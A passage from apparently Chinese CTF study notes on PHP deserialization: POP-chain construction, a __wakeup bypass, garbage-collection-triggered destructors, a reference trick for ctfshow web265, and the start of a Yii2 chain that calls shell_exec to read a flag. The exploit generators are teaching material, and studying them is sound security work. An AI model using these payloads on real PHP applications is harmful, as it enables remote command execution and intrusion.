variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Content-Length:的长度是POST数据的长度</p><h2 id="利用PHP垃圾回收机制构造POP链"><a href="#利用PHP垃圾回收机制构造POP链" class="headerlink" title="利用PHP垃圾回收机制构造POP链"></a>利用PHP垃圾回收机制构造POP链</h2><p> <a href="https://xz.aliyun.com/t/10961">https://xz.aliyun.com/t/10961</a> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Fun</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'call_user_func_array'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Don't serialize me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"serialize me?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/Test/"</span><span class="token punctuation">,</span><span class="token function">get_class</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"No test in Prod\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token variable">$p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span><span class="token comment">//存在循环引用</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pop</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no pop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先反序列化可以自己增加（删除）参数和值，即使原本没有参数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然B中没有定义a，但是也照样可以在exp中给B-&gt;a赋值，进行反序列化</p><p>exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Fun</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'call_user_func_array'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fun</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token string single-quoted-string">'Test::getFlag'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$fun</span><span class="token punctuation">;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r1</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"Fun":1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'"Fun":2:'</span><span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绕过__wakeup</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$r1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常规思路中我们的pop链是B→A→Fun→Test，可是B里的<code>__destruct()</code>方法貌似没有主动触发。在之前一篇文章说过destruct的触发</p><blockquote><p>__destruct（析构函数）当某个对象成为垃圾或者当对象被显式销毁时执行</p><p>显式销毁，当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL<br>隐式销毁，PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉</p></blockquote><p>在常规思路中destruct是隐式销毁触发的，当然这里使用强行GC</p><p>首先我们要简单了解垃圾回收是什么，就是把内存中不需要使用的量给清除掉，收回它所占用的空间。</p><h3 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h3><p>在php中，对应每个变量除了只保存它们的<strong>值和类型</strong>之外，还额外保存了两个内容，一个是<strong>当前这个变量是否被引用</strong>，另一个是<strong>引用的次数</strong>方便GC回收。</p><p>可以使用<code>xdebug_debug_zval()</code>来查看变量的<code>is_ref</code>和<code>refcount</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//is_ref=1 refcount=1</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//is_ref=1 refcount=1</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//is_ref=1 refcount=2</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//is_ref=1 refcount=3</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//is_ref=1 refcount=1</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no such symbol</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="旧的GC"><a href="#旧的GC" class="headerlink" title="旧的GC"></a>旧的GC</h3><p>在PHP5.3版本之前,使用的垃圾回收机制是单纯的“引用计数”。即：<br>①每个内存对象都分配一个计数器，当内存对象被变量引用时，计数器+1；<br>②当变量引用撤掉后（执行unset()后），计数器-1；<br>③当计数器&#x3D;0时，表明内存对象没有被使用，该内存对象则进行销毁，垃圾回收完成。</p><p>这个时候就出现了问题，我自己引用我自己，自身一个，自己又被引用，所以计数器是2，但我将它销毁，才减1，此时明明已销毁，但还是1，所以无法进行回收，产生了内存泄漏。</p><h4 id="新的GC"><a href="#新的GC" class="headerlink" title="新的GC"></a>新的GC</h4><p>每个php变量存在一个叫”zval”的变量容器中。一个zval变量容器，除了包含变量的类型和值，还包括<strong>两个字节的额外信息</strong>。</p><p>第一个是”is_ref”，是个bool值，用来标识这个变量是否是属于引用集合(reference set)。通过这个字节，php引擎才能把普通变量和引用变量区分开来，由于php允许用户通过使用&amp;来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。</p><p>第二个额外字节是”refcount”，用以表示指向这个zval变量容器的变量(也称符号即symbol)个数。所有的符号存在一个符号表中，其中每个符号都有作用域(scope)。</p><p>使用gc绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Fun</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'call_user_func_array'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">=</span><span class="token string double-quoted-string">"Test::getFlag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:3:"Fun":1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:3:"Fun":2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="unserialize-amp-serialize魔术方法详解"><a href="#unserialize-amp-serialize魔术方法详解" class="headerlink" title="__unserialize&amp;__serialize魔术方法详解"></a>__unserialize&amp;__serialize魔术方法详解</h2><p> <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke</a> (魔术方法详解)</p><p>这两个魔术方法需要php7.4以上才能生效</p><p>当<code>__serialize</code>和<code>__sleep</code>方法同时存在，序列化时忽略<code>__sleep</code>方法而执行<code>__serialize</code>；当<code>__unserialize</code>方法和<code>__wakeup</code>方法同时存在，反序列化时忽略<code>__wakeup</code>方法而执行<code>__unserialize</code></p><p><code>__unserialize</code>的参数：当<code>__serialize</code>方法存在时，参数为<code>__serialize</code>的返回数组；当<code>__serialize</code>方法不存在时，参数为实例对象的所有属性值组合而成的数组</p><h3 id="session的了解"><a href="#session的了解" class="headerlink" title="session的了解"></a>session的了解</h3><p>当我们编写一个<code>$_SESSION</code>时，服务器会</p><h3 id="控制session"><a href="#控制session" class="headerlink" title="控制session"></a>控制session</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//超过5次禁止登陆</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"登陆失败次数超过限制"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web265两个变量指向同一地址"><a href="#web265两个变量指向同一地址" class="headerlink" title="web265两个变量指向同一地址"></a>web265两个变量指向同一地址</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowAdmin</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshowAdmin</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化失败时，如果类名完整，仍然会执行对应类的__destruct方法</p><h2 id="yii框架反序列化链"><a href="#yii框架反序列化链" class="headerlink" title="yii框架反序列化链"></a>yii框架反序列化链</h2><p>首先看到这个样子</p><p><img src="/images/image-20220826202934387-1663348100930.png" alt="image-20220826202934387"></p><p><img src="/images/image-20220826202950564-1663348100930.png" alt="image-20220826202950564"></p><p><img src="/images/image-20220826203637021-1663348100930.png" alt="image-20220826203637021"></p><p>就应该是yii2.0</p><p> <a href="https://blog.csdn.net/qq_43571759/article/details/108804083">https://blog.csdn.net/qq_43571759/article/details/108804083</a> （利用链）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span><span class="token comment">//            /var/www/html/basic/web/1</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac /flag|tee 1'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token 